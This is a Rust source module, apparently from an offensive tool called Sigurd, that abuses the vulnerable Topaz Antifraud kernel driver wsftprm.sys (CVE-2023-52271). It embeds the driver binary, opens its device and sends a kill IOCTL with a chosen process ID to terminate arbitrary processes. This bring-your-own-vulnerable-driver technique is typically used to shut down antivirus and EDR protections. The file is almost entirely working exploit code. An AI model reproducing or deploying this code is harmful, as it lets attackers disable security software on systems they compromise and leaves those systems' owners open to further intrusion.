use std::ptr::null_mut;

use winapi::{
    ctypes::c_void, 
    um::{
        fileapi::{CreateFileW, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, ioapiset::DeviceIoControl, winnt::{GENERIC_READ, GENERIC_WRITE}
    }
};

use crate::{
    trace, 
    drivers::KillerDriver, 
    utils::{error::SigurdError, to_wstring}
};

const DRIVER_NAME: &str = "WSFTPrm";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\Warsaw_PM";
const IOCTL_KILL: u32 = 0x22201C;

static DRIVER: &'static [u8] = include_bytes!("../../../drivers/wsftprm.sys");

pub struct WSFTPrm {
    device: *mut c_void
}

impl WSFTPrm {}

impl KillerDriver for WSFTPrm {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        return Ok(Box::new(Self { device: 0 as *mut c_void }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ | GENERIC_WRITE, 
                0, null_mut(), 
                OPEN_EXISTING, 0, null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get dervice handle"));
            } else {
                trace!("Got device handle");
                self.device = handle;
                return Ok(true);
            }
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "A Topaz Antifraud kernel driver (CVE-2023-52271)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = DRIVER.to_vec();
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {    
            let mut buffer = [0u8; 1036];
            
            std::ptr::copy_nonoverlapping(
                &pid as *const u32 as *const u8,
                buffer.as_mut_ptr(),
                std::mem::size_of::<u32>()
            );
            
            let mut bytes = 0u32;
            let success = DeviceIoControl(
                self.device, 
                IOCTL_KILL, 
                buffer.as_mut_ptr() as *mut _, 
                buffer.len() as u32, 
                null_mut(),                     
                0, 
                &mut bytes, 
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}
